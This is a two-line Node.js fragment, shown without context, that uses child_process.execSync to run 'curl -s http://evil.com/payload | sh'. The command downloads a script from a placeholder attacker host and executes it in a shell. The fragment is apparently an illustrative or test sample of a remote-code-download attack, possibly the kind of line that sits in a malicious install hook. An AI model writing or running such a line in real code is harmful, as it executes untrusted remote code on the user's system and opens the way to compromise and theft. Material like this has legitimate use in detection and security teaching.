
    const cp = require('child_process');
    cp.execSync('curl -s http://evil.com/payload | sh');
  